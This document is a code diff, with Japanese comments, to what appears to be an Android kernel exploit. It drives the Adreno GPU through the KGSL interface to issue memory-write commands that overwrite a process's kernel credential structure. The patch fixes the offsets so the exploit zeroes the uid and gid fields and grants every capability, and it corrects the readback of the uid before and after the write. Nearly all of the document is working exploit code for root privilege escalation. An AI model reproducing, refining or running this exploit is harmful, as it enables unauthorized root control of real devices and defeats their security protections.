@@ -634,7 +634,7 @@ int main(int argc, char **argv) {
             uint32_t zl, zh, dl, dh, sl, sh;
             int dw;
 
-            // Read BEFORE
+            // Read BEFORE (uid は cbase+0x0c から)
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             dw = 0;
             cmd[dw++] = cp_type7(CP_NOP, 0);
@@ -652,8 +652,9 @@ int main(int argc, char **argv) {
                 wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint32_t *bd = (uint32_t *)dst_m;
+            // uid は offset 0x0c なので bd[3]
             printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
-                p, bd[31], bd[30], bd[1]);
+                p, bd[31], bd[30], bd[3]);
 
             n_ok++;
 
@@ -667,39 +668,36 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // ===== 修正: 正しい順序で Capability を書き込む =====
-            // オフセット 0x04 から 19 ワード (76バイト) を書き込む
+            // ===== 修正: 正しいオフセット (cbase+0x0c から) で書き込む =====
+            // 書き込むデータ: 8 ID フィールド (0), securebits (0x00000004),
+            // CapInh, CapPrm, CapEff, CapBset, CapAmbient 各 0x00000003ffffffff
             memset(ib_m, 0, 0x10000);
             dw = 0;
-            split64(cbase + 0x04, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);   // データ数 19
+            split64(cbase + 0x0c, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);   // データ数 19 (8+1+5*2)
             cmd[dw++] = zl; cmd[dw++] = zh;
 
-            // usage～fsgid (8ワード) = 0
+            // uid, gid, suid, sgid, euid, egid, fsuid, fsgid を 0
             for (int i = 0; i < 8; i++) cmd[dw++] = 0;
 
-            // securebits (0x24) = 0x00000004 (または0)
+            // securebits (0x30) = 0x00000004
             cmd[dw++] = 0x00000004;
 
-            // CapInh (0x28) = 0x00000003FFFFFFFF
-            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
+            // CapInh (0x34-0x38) = 0x00000003ffffffff
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+            // CapPrm (0x3c-0x40)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+            // CapEff (0x44-0x48)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+            // CapBset (0x4c-0x50)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+            // CapAmbient (0x54-0x58)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
 
-            // CapPrm (0x30) = 0x00000003FFFFFFFF
-            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
-
-            // CapEff (0x38) = 0x00000003FFFFFFFF
-            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
-
-            // CapBset (0x40) = 0x00000003FFFFFFFF
-            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
-
-            // CapAmbient (0x48) = 0x00000003FFFFFFFF
-            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
-
-            // Readback uid (0x04)
+            // Readback uid (cbase+0x0c)
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
-            split64(cbase + 0x04, &sl, &sh);
+            split64(cbase + 0x0c, &sl, &sh);
             cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
             cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
             cmd[dw++] = sl; cmd[dw++] = sh;
@@ -745,7 +743,7 @@ int main(int argc, char **argv) {
                 }
                 printf("\n");
                 printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
-                    cd[31], cd[30], cd[1]);
+                    cd[31], cd[30], cd[3]);
             }
         }
     }
